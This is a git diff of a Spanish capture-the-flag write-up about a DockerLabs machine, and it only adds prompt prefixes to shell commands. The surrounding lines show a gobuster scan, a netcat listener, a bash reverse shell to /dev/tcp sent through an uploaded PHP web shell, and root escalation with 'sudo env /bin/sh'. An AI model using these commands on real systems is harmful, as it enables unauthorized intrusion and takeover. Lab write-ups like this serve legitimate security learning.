@@ -28,7 +28,7 @@ Entramos y vemos una pagina web con un apartado para subir archivos.
 Realizamos un escaneo de subdominios con gobuster para ver si encontramos algo interesante.
 
 ```shell
-gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -76,7 +76,7 @@ Entramos a "https://www.revshells.com/" en esta web encontramos reverse shells y
 
 Ejecutamos netcat con el puento 9001 como puerto de escucha
 ```shell
-nc -lvnp 9001
+└─$ nc -lvnp 9001
 listening on [any] 9001 ...
 
 ```
@@ -92,14 +92,14 @@ http://172.17.0.2/uploads/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.0.2.15/9
 Ahora solo faltaria la escalada de privilegios
 Comprobamos los permisos del usuario con:
 ```shell
-sudo -l
+└─$ sudo -l
 ```
 
 ![Captura de pantalla 2024-05-13 210530](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/449ea752-5a93-4e67-a77e-d306b1111214)
 
 En este caso podemos ver que podemos ejecutar el binario "/usr/bin/env" siendo este usuario root como se puede apreciar y indica que no tiene contraseña entonces prodecedemos a ejecutar este binario:
 ```shell
-sudo env /bin/sh
+└─$ sudo env /bin/sh
 ```
 
 ![Captura de pantalla 2024-05-13 210851](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/6006d2f9-c5bf-44da-b6a8-e916850a9d0e)
